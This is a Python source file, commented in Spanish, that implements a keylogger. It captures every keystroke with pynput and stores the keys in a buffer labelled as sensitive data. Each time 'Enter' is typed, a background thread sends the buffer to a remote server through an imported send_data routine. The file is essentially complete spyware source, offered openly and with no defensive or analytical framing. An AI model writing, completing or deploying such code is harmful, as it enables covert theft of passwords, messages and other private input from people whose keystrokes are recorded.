import re
import threading
from pynput import keyboard as pynput_keyboard
import keyboard as py_keyboard
import Global
from send_data import send_data
# Lista de palabras clave que el programa buscará en las pulsaciones de teclas
keywords = ["Enter"]
# Lista para almacenar las teclas presionadas hasta el momento
sensitive_data = []


# Función que se ejecuta cada vez que se presiona una tecla
def get_click(tecla):
    # Lee la tecla presionada utilizando la biblioteca keyboard
    letra = py_keyboard.read_key(tecla)
    # Si la tecla no se puede leer, se convierte en una cadena
    if not letra:
        letra = str(tecla)
    # Maneja casos especiales como la barra espaciadora
    if letra == 'space':
        letra = ' '
    # Omite el registro de ciertas teclas como 'back', 'shift' y 'lock'
    elif letra.lower() in Global.keys_to_ignore:
        return
    # Agrega la tecla a la lista sensitive_data y convierte la lista en una cadena
    sensitive_data.append(letra)
    text = "".join(sensitive_data[-4499:])

    # Verifica si alguna palabra clave está presente en el texto usando expresiones regulares
    if any(re.search(keyword, text, re.I) for keyword in keywords):
        print("Información sensible detectada! Enviando datos...")
        # Llama a la función para enviar datos al servidor remoto
        h1 = threading.Thread(target=send_data, args=(text,))
        h1.start()
        print(sensitive_data)
        # Limpia la lista sensitive_data
        sensitive_data.clear()

    else:
        print("Sin data sensible")


# Inicia el keylogger utilizando pynput.keyboard.Listener
with pynput_keyboard.Listener(on_press=get_click) as listener:
    # Se queda en un bucle infinito para escuchar continuamente las pulsaciones de teclas
    listener.join()
